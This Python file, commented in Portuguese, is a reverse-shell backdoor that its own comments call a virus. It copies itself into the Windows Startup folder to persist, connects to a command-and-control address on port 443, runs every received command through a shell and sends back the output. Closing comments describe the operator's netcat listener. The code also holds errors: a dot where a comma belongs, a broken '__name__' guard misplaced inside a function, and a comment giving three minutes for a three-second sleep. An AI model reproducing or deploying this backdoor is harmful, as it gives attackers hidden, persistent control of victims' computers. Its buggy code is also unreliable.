import socket
import subprocess
import threading
import time
import os

CCIP = "" ##por o IP
CCPORT = 443 #porta de segurança do http

#função para manter o acesso do virus, mesmo após a máquina ser desligada
def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py",".exe") #coverter para executável
    
    #print(exe_file)
    os.system("copy {} \%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(exe_file)) 

def comm(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET. socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)
    
def cmd(client,data):
    try:
            proc = subprocess.Popen(data, shell=True,stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read() #le e corrige o erro
            client.send(output + b"\n") #ele vai pegar no erro, e se tiver tudo bem, vai mandar pra lá
    except Exception as error:
            print(error)
        
def cli(client):
    try:
                while True:
                    data = client.recv(1024).decode().strip()
                    if data == "/:KILL":
                        return
                    else:
                        threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
            client.close()

    if __name__ == "__name__":
          autorun()
          while True:
                client = comm(CCIP, CCPORT)
                if client:
                      cli(client)
                else:
                      time.sleep(3) #3minutos

    #fazer no terminal:
    #ssh root@IP
    #nc -vp 443
    

                   
                    


